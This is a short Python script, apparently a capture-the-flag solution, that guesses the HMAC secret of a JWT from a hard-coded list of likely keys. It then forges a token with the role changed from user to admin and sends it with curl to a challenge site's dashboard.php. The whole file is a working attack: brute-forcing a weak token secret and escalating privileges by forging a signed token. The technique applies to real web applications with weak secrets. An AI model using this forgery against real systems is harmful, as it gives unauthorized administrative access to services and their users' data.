import hmac
import hashlib
import base64
import subprocess
import json

# 原始 token 的 payload
original_payload_b64 = 'eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ3MDY3MTJ9'
original_signature = 'CqErZOY8Ac-MBNgnLOXKu8G1WJlUzOIcrIkpu9ji6gA'

# 篡改后的 payload
admin_payload = {'sub': '1', 'role': 'admin', 'exp': 1774706712}
admin_payload_b64 = base64.urlsafe_b64encode(json.dumps(admin_payload, separators=(',', ':')).encode()).decode().rstrip('=')

header = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'

# 从源码或注释中可能的密钥
possible_keys = [
    'star', 'xm', 'ctf', 'flag', 'secret', 'password', 'admin',
    'staralliance', 'xmuser', '123456', 'key', 'jwtsecret',
    '0f2027203a432c5364',  # CSS 里的颜色
    'star-ctf-2024',
]

print('Testing possible keys...')

for key in possible_keys:
    # 先验证原始 token
    message = header + '.' + original_payload_b64
    signature = hmac.new(key.encode(), message.encode(), hashlib.sha256).digest()
    signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

    if signature_b64 == original_signature:
        print(f'✅ FOUND KEY: {key!r}')

        # 生成 admin token
        message_admin = header + '.' + admin_payload_b64
        signature_admin = hmac.new(key.encode(), message_admin.encode(), hashlib.sha256).digest()
        signature_admin_b64 = base64.urlsafe_b64encode(signature_admin).decode().rstrip('=')

        jwt_admin = message_admin + '.' + signature_admin_b64
        print(f'Admin JWT: {jwt_admin}')
        print()

        # 测试 admin token
        result = subprocess.run(['curl.exe', '-X', 'GET',
                                'http://80-3829ff0b-6e88-4697-9c89-87d2b7b04632.challenge.ctfplus.cn/dashboard.php',
                                '-H', f'Cookie: token={jwt_admin}', '-s'], capture_output=True, text=True)
        print('Response:')
        print(result.stdout)
        break
else:
    print('No key found in common list')
